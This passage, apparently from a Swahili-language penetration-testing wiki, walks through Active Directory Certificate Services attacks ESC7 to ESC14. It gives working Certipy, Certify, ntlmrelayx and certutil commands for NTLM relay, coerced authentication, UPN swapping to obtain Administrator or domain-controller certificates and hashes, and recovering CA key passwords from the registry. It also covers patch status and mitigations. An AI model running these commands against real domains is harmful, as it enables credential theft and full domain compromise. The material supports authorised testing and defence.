Na hatimaye, tunaweza **kupata cheti kilichotolewa** kwa kutumia amri ya `req` na kigezo cha `-retrieve <request ID>`.

```bash
certipy req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -retrieve 785
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Rerieving certificate with ID 785
[*] Successfully retrieved certificate
[*] Got certificate with UPN 'administrator@corp.local'
[*] Certificate has no object SID
[*] Loaded private key from '785.key'
[*] Saved certificate and private key to 'administrator.pfx'
```

### Attack 3 – Abuse ya Extension ya Manage Certificates (SetExtension)

#### Maelezo

Mbali na matumizi mabaya ya kawaida ya ESC7 (kuwezesha sifa za EDITF au kuidhinisha maombi yanayosubiri), **Certify 2.0** ilifichua primitive mpya kabisa inayohitaji tu jukumu la *Manage Certificates* (pia huitwa **Certificate Manager / Officer**) kwenye Enterprise CA.<sup>[[3]](#references)</sup>

Mbinu ya RPC ya `ICertAdmin::SetExtension` inaweza kutekelezwa na principal yoyote yenye *Manage Certificates*. Ingawa mbinu hii ilitumika jadi na CAs halali kusasisha extensions kwenye maombi **yanayosubiri**, mshambuliaji anaweza kuitumia vibaya **kuongeza extension ya cheti isiyo *default*** (kwa mfano, OID maalum ya *Certificate Issuance Policy* kama `1.1.1.1`) kwenye ombi linalosubiri idhini.

Kwa kuwa template inayolengwa **haifafanui thamani ya default ya extension hiyo**, CA HAITAANDIKA juu ya thamani inayodhibitiwa na mshambuliaji ombi litakapotolewa hatimaye. Kwa hiyo, cheti kitakachotolewa kitakuwa na extension iliyochaguliwa na mshambuliaji, ambayo inaweza:

* Kutimiza mahitaji ya Application / Issuance Policy ya templates nyingine zilizo hatarini (na kusababisha kupandisha marupurupu).
* Kuingiza EKUs au policies za ziada zinazoupa cheti uaminifu usiotarajiwa kwenye mifumo ya wahusika wengine.

Kwa kifupi, *Manage Certificates* — ambayo awali ilichukuliwa kuwa sehemu “isiyo na nguvu sana” ya ESC7 — sasa inaweza kutumiwa kupandisha marupurupu kikamilifu au kudumisha ufikiaji wa muda mrefu, bila kugusa usanidi wa CA au kuhitaji haki yenye vizuizi zaidi ya *Manage CA*.

#### Kutumia vibaya primitive hii kwa Certify 2.0

1. **Wasilisha ombi la cheti litakalobaki *pending*.** Hili linaweza kulazimishwa kwa template inayohitaji idhini ya msimamizi:
   ```powershell
   Certify.exe request --ca SERVER\\CA-NAME --template SecureUser --subject "CN=User" --manager-approval
   # Take note of the returned Request ID
   ```

2. **Ongeza kiendelezi maalum kwenye ombi linalosubiri** kwa kutumia amri mpya ya manage-ca:
   ```powershell
   Certify.exe manage-ca --ca SERVER\\CA-NAME \
                     --request-id 1337 \
                     --set-extension "1.1.1.1=DER,10,01 01 00 00"  # fake issuance-policy OID
   ```
   *Ikiwa template haijafafanua tayari extension ya *Certificate Issuance Policies*, thamani iliyo hapo juu itahifadhiwa baada ya kutolewa.*

3. **Toa ombi** (ikiwa role yako pia ina haki za kuidhinisha *Manage Certificates*) au subiri operator aliidhinishe. Likishatolewa, pakua certificate:
   ```powershell
   Certify.exe request-download --ca SERVER\\CA-NAME --id 1337
   ```

4. Cheti kilichopatikana sasa kina OID ya sera ya utoaji yenye nia ovu na kinaweza kutumika katika mashambulizi yanayofuata (kwa mfano ESC13, domain escalation, n.k.).

> NOTE: Shambulizi hili hili linaweza kutekelezwa kwa Certipy ≥ 4.7 kupitia amri ya `ca` na kigezo cha `-set-extension`.

## NTLM Relay to AD CS HTTP Endpoints – ESC8

### Maelezo

> [!TIP]
> Katika mazingira ambako **AD CS imesakinishwa**, ikiwa kuna **endpoint ya web enrollment iliyo hatarini** na angalau **certificate template moja imechapishwa** inayoruhusu **kompyuta za domain kujisajili na kutumia client authentication** (kama template ya kawaida ya **`Machine`**), mshambuliaji anaweza **kuathiri kompyuta yoyote ambayo huduma ya spooler imewashwa**!

AD CS inasaidia **mbinu kadhaa za usajili zinazotumia HTTP**, zinazopatikana kupitia majukumu ya ziada ya seva ambayo wasimamizi wanaweza kusakinisha. Violesura hivi vya usajili wa vyeti kupitia HTTP vinaweza kushambuliwa kwa **NTLM relay attacks**. Mshambuliaji, kutoka kwenye **kompyuta iliyoathiriwa, anaweza kujifanya akaunti yoyote ya AD inayothibitisha utambulisho wake kupitia NTLM inayoingia**. Anapojifanya akaunti ya mwathiriwa, mshambuliaji anaweza kufikia violesura hivi vya wavuti ili **kuomba cheti cha client authentication kwa kutumia certificate templates za `User` au `Machine`**.

- **Kiolesura cha web enrollment** (programu ya zamani ya ASP inayopatikana kwenye `http://<caserver>/certsrv/`) hutumia HTTP pekee kwa chaguomsingi, ambayo hailindi dhidi ya NTLM relay attacks. Zaidi ya hayo, kinaruhusu waziwazi uthibitishaji wa NTLM pekee kupitia kichwa chake cha Authorization HTTP, hivyo mbinu salama zaidi za uthibitishaji kama Kerberos haziwezi kutumika.
- **Certificate Enrollment Service** (CES), huduma ya wavuti ya **Certificate Enrollment Policy** (CEP), na **Network Device Enrollment Service** (NDES) kwa chaguomsingi zinaunga mkono uthibitishaji wa negotiate kupitia kichwa chao cha Authorization HTTP. Uthibitishaji wa negotiate **unaunga mkono Kerberos na** **NTLM**, hivyo mshambuliaji anaweza **kushusha kiwango cha uthibitishaji hadi NTLM** wakati wa relay attacks. Ingawa huduma hizi za wavuti huwezesha HTTPS kwa chaguomsingi, HTTPS pekee **hailindi dhidi ya NTLM relay attacks**. Ulinzi dhidi ya NTLM relay attacks kwa huduma za HTTPS unawezekana tu HTTPS inapotumiwa pamoja na channel binding. Kwa bahati mbaya, AD CS haiwashi Extended Protection for Authentication kwenye IIS, ambayo inahitajika kwa channel binding.<sup>[[6]](#references)</sup>

**Tatizo** la kawaida la NTLM relay attacks ni **muda mfupi wa vipindi vya NTLM** na kutoweza kwa mshambuliaji kuwasiliana na huduma zinazohitaji **NTLM signing**.

Hata hivyo, kizuizi hiki kinaweza kushindwa kwa kutumia NTLM relay attack ili kupata cheti cha mtumiaji, kwa kuwa muda wa uhalali wa cheti ndio huamua muda wa kipindi, na cheti kinaweza kutumiwa na huduma **zinazohitaji NTLM signing**. Kwa maelekezo kuhusu kutumia cheti kilichoibwa, angalia:


{{#ref}}
account-persistence.md
{{#endref}}

Kizuizi kingine cha NTLM relay attacks ni kwamba **akaunti ya mwathiriwa lazima ithibitishe utambulisho wake kwa kompyuta inayodhibitiwa na mshambuliaji**. Mshambuliaji anaweza kusubiri au kujaribu **kulazimisha** uthibitishaji huo:


{{#ref}}
../printers-spooler-service-abuse.md
{{#endref}}

### **Matumizi mabaya**

[**Certify**](https://github.com/GhostPack/Certify)’s `cas` huorodhesha **endpoints za HTTP za AD CS zilizowashwa**:<sup>[[4]](#references)</sup>

```
Certify.exe cas
```

<figure><img src="../../../images/image (72).png" alt=""><figcaption></figcaption></figure>

Sifa ya `msPKI-Enrollment-Servers` hutumiwa na Certificate Authorities (CAs) za enterprise kuhifadhi endpoints za Certificate Enrollment Service (CES). Endpoints hizi zinaweza kuchanganuliwa na kuorodheshwa kwa kutumia zana ya **Certutil.exe**:

```
certutil.exe -enrollmentServerURL -config DC01.DOMAIN.LOCAL\DOMAIN-CA
```

<figure><img src="../../../images/image (757).png" alt=""><figcaption></figcaption></figure>

```bash
Import-Module PSPKI
Get-CertificationAuthority | select Name,Enroll* | Format-List *
```

<figure><img src="../../../images/image (940).png" alt=""><figcaption></figcaption></figure>

#### Matumizi mabaya ya Certify

```bash
## In the victim machine
# Prepare to send traffic to the compromised machine 445 port to 445 in the attackers machine
PortBender redirect 445 8445
rportfwd 8445 127.0.0.1 445
# Prepare a proxy that the attacker can use
socks 1080

## In the attackers
proxychains ntlmrelayx.py -t http://<AC Server IP>/certsrv/certfnsh.asp -smb2support --adcs --no-http-server

# Force authentication from victim to compromised machine with port forwards
execute-assembly C:\SpoolSample\SpoolSample\bin\Debug\SpoolSample.exe <victim> <compromised>
```

#### Matumizi mabaya kwa kutumia [Certipy](https://github.com/ly4k/Certipy)

Kwa chaguomsingi, Certipy huomba cheti kulingana na template `Machine` au `User`, kulingana na iwapo jina la akaunti inayorelayiwa linaishia kwa `$`. Template nyingine inaweza kubainishwa kwa kutumia kigezo cha `-template`.

Mbinu kama [PetitPotam](https://github.com/ly4k/PetitPotam) inaweza kutumiwa kulazimisha uthibitishaji. Unaposhughulika na vidhibiti vya kikoa, ni lazima ubainishe `-template DomainController`.

```bash
certipy relay -ca ca.corp.local
Certipy v4.0.0 - by Oliver Lyak (ly4k)

[*] Targeting http://ca.corp.local/certsrv/certfnsh.asp
[*] Listening on 0.0.0.0:445
[*] Requesting certificate for 'CORP\\Administrator' based on the template 'User'
[*] Got certificate with UPN 'Administrator@corp.local'
[*] Certificate object SID is 'S-1-5-21-980154951-4172460254-2779440654-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

## No Security Extension - ESC9 <a href="#id-5485" id="id-5485"></a>

### Maelezo

Thamani ya **`CT_FLAG_NO_SECURITY_EXTENSION`** (`0x80000`) ya **`msPKI-Enrollment-Flag`**, inayojulikana kama ESC9, huondoa SID extension ya `szOID_NTDS_CA_SECURITY_EXT` kwenye certificate. Mifano ya zamani ya ESC9 hutegemea tabia ya uoanifu ya KDC (`StrongCertificateBindingEnforcement=1`) au njia tofauti ya weak Schannel mapping. Thamani `1` ni **mpangilio wa kihistoria wa uoanifu**, si mpangilio chaguomsingi wa sasa: Microsoft inasema kuwa override ya KDC iliacha kuungwa mkono baada ya Windows security update ya Septemba 9, 2025. Kagua update halisi ya target na endpoint ya authentication kabla ya kutumia mwongozo wa zamani.<sup>[[7]](#references)</sup> Tazama [mwongozo wa Microsoft wa rollout](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers).

Masharti yanayofanya mpangilio wa flag hii kuwa muhimu ni pamoja na:

- Kwenye KDC ya zamani inayooana, sera inayotumika ya certificate-binding inaruhusu mapping; au endpoint ya Schannel huwezesha UPN mapping kando kupitia bit `0x4` ya `CertificateMappingMethods`.
- Certificate imewekwa flag ya `CT_FLAG_NO_SECURITY_EXTENSION` ndani ya mpangilio wa `msPKI-Enrollment-Flag`.
- Certificate inabainisha EKU yoyote ya client authentication.
- Ruhusa za `GenericWrite` zinapatikana kwenye account yoyote ili kucompromise account nyingine.

### Hali ya Abuse

Tuseme `John@corp.local` ana ruhusa za `GenericWrite` kwenye `Jane@corp.local`, na lengo ni kucompromise `Administrator@corp.local`. Template ya certificate ya `ESC9`, ambayo `Jane@corp.local` inaruhusiwa ku-enroll ndani yake, imesanidiwa kwa flag ya `CT_FLAG_NO_SECURITY_EXTENSION` kwenye mpangilio wake wa `msPKI-Enrollment-Flag`.

Kwanza, hash ya `Jane` inapatikana kwa kutumia Shadow Credentials, kutokana na ruhusa za `GenericWrite` za `John`:

```bash
certipy shadow auto -username John@corp.local -password Passw0rd! -account Jane
```

Baadaye, `userPrincipalName` ya `Jane` inabadilishwa kuwa `Administrator`, kwa makusudi ikiacha sehemu ya domain ya `@corp.local`:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

Marekebisho haya hayakiuki masharti, kwa kuwa `Administrator@corp.local` inabaki tofauti na `userPrincipalName` ya `Administrator`.

Baada ya hapo, kiolezo cha cheti cha `ESC9`, kilichowekwa alama kuwa hatarishi, kinaombwa kwa jina la `Jane`:

```bash
certipy req -username jane@corp.local -hashes <hash> -ca corp-DC-CA -template ESC9
```

Imebainika kuwa `userPrincipalName` ya cheti inaonyesha `Administrator`, bila “object SID” yoyote.

Kisha `userPrincipalName` ya `Jane` inarejeshwa kwenye thamani yake ya awali, `Jane@corp.local`:

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

Kujaribu kuthibitisha utambulisho kwa kutumia cheti kilichotolewa sasa kunatoa NT hash ya `Administrator@corp.local`. Amri lazima iwe na `-domain <domain>` kwa sababu cheti hakijabainisha domain:

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

## Ulinganishaji Dhaifu wa Vyeti - ESC10

### Maelezo

Sera mbili tofauti za ulinganishaji wa vyeti hujadiliwa mara nyingi chini ya ESC10. Soma mpangilio kwenye endpoint inayoshughulikia uthibitishaji husika:

- Schannel `CertificateMappingMethods` chini ya `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SecurityProviders\Schannel` hudhibiti ulinganishaji wa vyeti vya mteja vya TLS kwenye application server. Bit ya UPN ni `0x4`; thamani chaguomsingi kwenye mifumo iliyosasishwa ni `0x18` (`0x8 | 0x10`).
- KDC `StrongCertificateBindingEnforcement` chini ya `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Kdc` kihistoria ilidhibiti ulinganifu wa Kerberos wa binding ya vyeti. Thamani `1` si thamani chaguomsingi ya sasa inayoweza kutegemewa, na Microsoft ilisitisha usaidizi wa override hii kwa sasisho la usalama la Windows la Septemba 9, 2025. Hali yake pekee haielezi ulinganishaji wa UPN wa Schannel.<sup>[[7]](#references)</sup>

**Kisa cha 1**

Kihistoria, pale KDC ya zamani ilipoheshimu `StrongCertificateBindingEnforcement=0`; hakikisha kiwango cha sasisho, kwa kuwa override hii haitumiki tena kwenye mifumo ya sasa iliyo na viraka.

**Kisa cha 2**

Wakati bit ya UPN (`0x4`) ya `CertificateMappingMethods` imewashwa kwenye endpoint ya cheti cha mteja ya Schannel. Huu ni mpangilio tofauti na enforcement ya strong-binding ya KDC, na bado unahitaji cheti cha client-authentication kinachoweza kusajiliwa pamoja na udhibiti halisi wa attribute ya akaunti inayolinganishwa.

### Kisa cha Matumizi Mabaya 1

Katika deployment ya zamani ambapo KDC bado inaheshimu `StrongCertificateBindingEnforcement=0`, udhibiti wa `userPrincipalName` ya akaunti unaweza kuwa sehemu ya njia ya ulinganishaji dhaifu kuelekea akaunti nyingine. Usajili wa cheti unaohitajika, ulinganishaji, utambulisho lengwa, na uthibitishaji uliofaulu lazima vikaguliwe tofauti; ACE ya `GenericWrite` au thamani ya registry pekee haithibitishi kutekwa kwa akaunti.

Kwa mfano, akiwa na ruhusa za `GenericWrite` kwenye `Jane@corp.local`, mshambuliaji analenga kuhujumu `Administrator@corp.local`. Utaratibu huu unafanana na ESC9, na kuruhusu kutumia template yoyote ya cheti.

Mwanzoni, hash ya `Jane` hupatikana kwa kutumia Shadow Credentials, kwa kutumia vibaya ruhusa za `GenericWrite`.

```bash
certipy shadow autho -username John@corp.local -p Passw0rd! -a Jane
```

Baadaye, `userPrincipalName` ya `Jane` hubadilishwa kuwa `Administrator`, huku sehemu ya `@corp.local` ikiachwa kwa makusudi ili kuepuka ukiukaji wa kizuizi.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Administrator
```

Kufuatia hili, cheti kinachowezesha uthibitishaji wa mteja kinaombwa kama `Jane`, kwa kutumia template chaguomsingi ya `User`.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

`userPrincipalName` ya `Jane` kisha inarejeshwa katika thamani yake ya awali, `Jane@corp.local`.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn Jane@corp.local
```

Kuthibitisha utambulisho kwa kutumia cheti kilichopatikana kutatoa NT hash ya `Administrator@corp.local`, hivyo ni lazima kubainisha domain kwenye command kwa kuwa cheti hakina maelezo ya domain.

```bash
certipy auth -pfx administrator.pfx -domain corp.local
```

### Kisa cha Matumizi Mabaya 2

Ikiwa `CertificateMappingMethods` ina bit flag ya `UPN` (`0x4`), akaunti A yenye ruhusa za `GenericWrite` inaweza kuhujumu akaunti yoyote B ambayo haina sifa ya `userPrincipalName`, ikijumuisha akaunti za mashine na akaunti ya msimamizi wa domain iliyojengewa ndani, `Administrator`.

Hapa, lengo ni kuhujumu `DC$@corp.local`, tukianzia kwa kupata hash ya `Jane` kupitia Shadow Credentials, tukitumia `GenericWrite`.

```bash
certipy shadow auto -username John@corp.local -p Passw0rd! -account Jane
```

`userPrincipalName` ya `Jane` kisha huwekwa kuwa `DC$@corp.local`.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'DC$@corp.local'
```

Cheti cha uthibitishaji wa mteja kinaombwa kama `Jane` kwa kutumia kiolezo chaguomsingi cha `User`.

```bash
certipy req -ca 'corp-DC-CA' -username Jane@corp.local -hashes <hash>
```

`userPrincipalName` ya `Jane` hurejeshwa katika hali yake ya awali baada ya mchakato huu.

```bash
certipy account update -username John@corp.local -password Passw0rd! -user Jane -upn 'Jane@corp.local'
```

Ili kuthibitisha kupitia Schannel, chaguo la `-ldap-shell` la Certipy hutumika, kuonyesha kuwa uthibitishaji umefaulu kama `u:CORP\DC$`.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

Kupitia LDAP shell, amri kama `set_rbcd` huwezesha mashambulizi ya Resource-Based Constrained Delegation (RBCD), ambayo yanaweza kuhatarisha domain controller.

```bash
certipy auth -pfx dc.pfx -dc-ip 172.16.126.128 -ldap-shell
```

Athari hii pia inahusu akaunti yoyote ya mtumiaji isiyo na `userPrincipalName`, au ambayo thamani yake hailingani na `sAMAccountName`. Akaunti chaguomsingi ya `Administrator@corp.local` ni shabaha kuu kwa sababu ina haki za juu za LDAP na kwa kawaida haina `userPrincipalName`.

## Kurelay NTLM hadi ICPR - ESC11

### Maelezo

Ikiwa CA Server haijasanidiwa kwa `IF_ENFORCEENCRYPTICERTREQUEST`, mashambulizi ya NTLM relay yanaweza kufanywa bila signing kupitia huduma ya RPC. [Rejeleo hapa](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).<sup>[[10]](#references)</sup>

Unaweza kutumia `certipy` kubaini ikiwa `Enforce Encryption for Requests` imezimwa; certipy itaonyesha udhaifu wa `ESC11`.

```bash
$ certipy find -u <user>@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
  0
    CA Name                             : DC01-CA
    DNS Name                            : DC01.domain.local
    Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
    ....
    Enforce Encryption for Requests     : Disabled
    ....
    [!] Vulnerabilities
      ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```

### Mfano wa Matumizi Mabaya

Inahitajika kusanidi seva ya relay:

```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

Kumbuka: Kwa vidhibiti vya kikoa, lazima tubainishe `-template` katika DomainController.

Au kwa kutumia [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) :

```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```

## Ufikiaji wa shell kwenye ADCS CA kwa kutumia YubiHSM - ESC12

### Maelezo

Wasimamizi wanaweza kusanidi Certificate Authority ili ihifadhiwe kwenye kifaa cha nje kama vile "Yubico YubiHSM2".

Ikiwa kifaa cha USB kimeunganishwa kwenye seva ya CA kupitia mlango wa USB, au kupitia seva ya vifaa vya USB ikiwa seva ya CA ni mashine pepe, ufunguo wa uthibitishaji (wakati mwingine huitwa "nenosiri") unahitajika ili Key Storage Provider izalishe na kutumia funguo kwenye YubiHSM.

Ufunguo/nenosiri hili huhifadhiwa katika registry chini ya `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` katika cleartext.

Rejea [hapa](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).<sup>[[11]](#references)</sup>

### Hali ya Matumizi Mabaya

Ikiwa ufunguo wa faragha wa CA umehifadhiwa kwenye kifaa halisi cha USB wakati ulipopata ufikiaji wa shell, inawezekana kuurejesha.

Kwanza, unahitaji kupata cheti cha CA (hiki ni cha umma), kisha:

```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```

Mwishowe, tumia amri ya `certutil -sign` ili kutengeneza certificate mpya ya kiholela kwa kutumia certificate ya CA na private key yake.

## OID Group Link Abuse - ESC13

### Maelezo

Sifa ya `msPKI-Certificate-Policy` huruhusu sera ya utoaji kuongezwa kwenye template ya certificate. Vitu vya `msPKI-Enterprise-Oid` vinavyohusika na kutoa sera vinaweza kugunduliwa katika Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) ya kontena la PKI OID. Sera inaweza kuunganishwa na kundi la AD kwa kutumia sifa ya `msDS-OIDToGroupLink` ya kitu hiki, na hivyo kuruhusu mfumo kumuidhinisha mtumiaji anayewasilisha certificate kana kwamba ni mwanachama wa kundi hilo. [Rejelea hapa](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).<sup>[[12]](#references)</sup>

Kwa maneno mengine, mtumiaji anapokuwa na ruhusa ya kujiandikisha kupata certificate na certificate hiyo imeunganishwa na kundi la OID, mtumiaji anaweza kurithi ruhusa za kundi hilo.

Tumia [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) kutafuta OIDToGroupLink:

```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```

### Hali ya Unyonyaji

Tafuta ruhusa ya mtumiaji; unaweza kutumia `certipy find` au `Certify.exe find /showAllPermissions`.

Ikiwa `John` ana ruhusa ya kujisajili kwenye `VulnerableTemplate`, mtumiaji huyo anaweza kurithi haki za kikundi cha `VulnerableGroup`.

Anachohitaji kufanya ni kubainisha template pekee; atapata cheti chenye haki za OIDToGroupLink.

```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```

## Matumizi Mabaya ya Ulinganishaji Wazi wa Vyeti — ESC14

### Maelezo

Maelezo kwenye https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation#esc14-weak-explicit-certificate-mapping yana maelezo ya kina sana. Hapa chini kuna nukuu ya maandishi asilia.<sup>[[14]](#references)</sup>

ESC14 inahusu udhaifu unaotokana na “weak explicit certificate mapping”, hasa matumizi mabaya au usanidi usio salama wa sifa ya `altSecurityIdentities` kwenye akaunti za watumiaji au kompyuta za Active Directory. Sifa hii yenye thamani nyingi huruhusu wasimamizi kuhusisha vyeti vya X.509 na akaunti ya AD kwa madhumuni ya authentication. Ijapojazwa, ulinganishaji huu wa wazi unaweza kuchukua nafasi ya mantiki chaguomsingi ya ulinganishaji wa vyeti, ambayo kwa kawaida hutegemea UPN au majina ya DNS kwenye SAN ya cheti, au SID iliyopachikwa kwenye kiendelezi cha usalama cha `szOID_NTDS_CA_SECURITY_EXT`.

Ulinganishaji “dhaifu” hutokea pale thamani ya mfuatano inayotumika kwenye sifa ya `altSecurityIdentities` kutambua cheti inapokuwa pana mno, ni rahisi kukisiwa, inategemea sehemu za cheti zisizo za kipekee, au inatumia vipengele vya cheti vinavyoweza kughushiwa kwa urahisi. Ikiwa mshambulizi anaweza kupata au kutengeneza cheti chenye sifa zinazolingana na ulinganishaji dhaifu wa wazi wa akaunti yenye upendeleo, anaweza kutumia cheti hicho kufanya authentication kama akaunti hiyo na kujifanya kuwa akaunti hiyo.

Mifano ya mifuatano ya ulinganishaji inayoweza kuwa dhaifu kwenye `altSecurityIdentities` ni pamoja na:

- Kulinganisha kwa kutumia Subject Common Name (CN) ya kawaida tu: kwa mfano, `X509:<S>CN=SomeUser`. Mshambulizi anaweza kupata cheti chenye CN hii kutoka chanzo kisicho salama sana.
- Kutumia Issuer Distinguished Name (DN) au Subject DN za jumla kupita kiasi bila sifa nyingine, kama vile nambari mahususi ya mfululizo au kitambulishi cha ufunguo wa somo: kwa mfano, `X509:<I>CN=SomeInternalCA<S>CN=GenericUser`.
- Kutumia mifumo mingine inayoweza kutabirika au vitambulishi visivyo vya kriptografia ambavyo mshambulizi anaweza kutimiza kwenye cheti anachoweza kupata kihalali au kughushi (ikiwa amehatarisha CA au amepata template iliyo hatarini kama ilivyo kwenye ESC1).

Sifa ya `altSecurityIdentities` hutumia miundo mbalimbali ya ulinganishaji, kama vile:

- `X509:<I>IssuerDN<S>SubjectDN` (hulinganisha kwa kutumia Issuer DN na Subject DN kamili)
- `X509:<SKI>SubjectKeyIdentifier` (hulinganisha kwa kutumia thamani ya kiendelezi cha Subject Key Identifier cha cheti)
- `X509:<SR>SerialNumberBackedByIssuerDN` (hulinganisha kwa kutumia nambari ya mfululizo, inayohusishwa kwa njia isiyo ya moja kwa moja na Issuer DN) - huu si muundo sanifu; kwa kawaida huwa `<I>IssuerDN<SR>SerialNumber`.
- `X509:<RFC822>EmailAddress` (hulinganisha kwa kutumia jina la RFC822, kwa kawaida anwani ya barua pepe, kutoka SAN)
- `X509:<SHA1-PUKEY>Thumbprint-of-Raw-PublicKey` (hulinganisha kwa kutumia hash ya SHA1 ya ufunguo wa umma ghafi wa cheti - kwa ujumla ni imara)

Usalama wa ulinganishaji huu hutegemea vitambulishi vilivyomo. Microsoft inaainisha ulinganishaji unaotegemea barua pepe au majina ya somo, ukiwemo `X509:<RFC822>`, kuwa **dhaifu**. Katika hali ya Full Enforcement, cheti kisicho na ulinganishaji imara hukataliwa; sasisho la usalama la Windows la Septemba 2025 liliondoa chaguo la kurejea kwenye hali ya Compatibility. Kwa hiyo, ulinganishaji dhaifu pekee si njia ya kuaminika ya sasa ya kujifanya mtumiaji mwingine. Kabla ya kutathmini hali ya ulinganishaji dhaifu, kagua kiwango halisi cha masasisho cha domain controller na jinsi inavyoshughulikia ulinganishaji wa vyeti. Ruhusa ya kuandika kwenye `altSecurityIdentities` ni jambo tofauti la kuchunguza: mshambulizi aliye na cheti kinachoaminika kinachofaa anaweza kuongeza ulinganishaji **imara** wa wazi, kutegemea ruhusa zinazotumika na uthibitishaji wa cheti. Tazama [Microsoft KB5014754](https://support.microsoft.com/en-us/servicing/os/windows-server/2022/05/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers) na [utafiti wa ESC14](https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/).

Hitilafu za certificate authentication pia zinahitaji kuchunguzwa: akaunti lengwa iliyozimwa au nenosiri lililoisha muda wake vinaweza kuzuia login hata kama cheti chenyewe bado ni halali.

### Hali ya Matumizi Mabaya

ESC14 inalenga **explicit certificate mappings** katika Active Directory (AD), hasa sifa ya `altSecurityIdentities`. Ikiwa sifa hii imewekwa (kwa usanifu au kutokana na usanidi usio sahihi), washambulizi wanaweza kujifanya akaunti nyingine kwa kuwasilisha vyeti vinavyolingana na ulinganishaji huo.

#### Hali A: Mshambulizi Anaweza Kuandika kwenye `altSecurityIdentities`

 **Sharti la awali**: Mshambulizi ana ruhusa za kuandika kwenye sifa ya `altSecurityIdentities` ya akaunti lengwa au ruhusa ya kumpa mtu mwingine ruhusa hiyo kwa kutumia mojawapo ya ruhusa zifuatazo kwenye object ya AD lengwa:  
- Write property `altSecurityIdentities`  
- Write property `Public-Information`  
- Write property (all)  
- `WriteDACL`  
- `WriteOwner`*  
- `GenericWrite`  
- `GenericAll`  
- Owner*.
#### Hali B: Lengo Lina Ulinganishaji Dhaifu kupitia X509RFC822 (Barua Pepe)

- **Sharti la awali la kihistoria/masharti**: Lengo lina ulinganishaji dhaifu wa X509RFC822 kwenye `altSecurityIdentities`, mshambulizi anaweza kuhariri sifa ya `mail` ya enrollee, na template inayofaa inajumuisha barua pepe hiyo kwenye cheti cha client-authentication bila SID binding inayokinzana. Authentication pia inahitaji mazingira ambayo bado yanakubali ulinganishaji dhaifu; Full Enforcement hukataa ulinganishaji wa vyeti unaotegemea ulinganishaji dhaifu pekee. Sifa ya `mail` inayoweza kuandikwa pekee ni kidokezo tu.
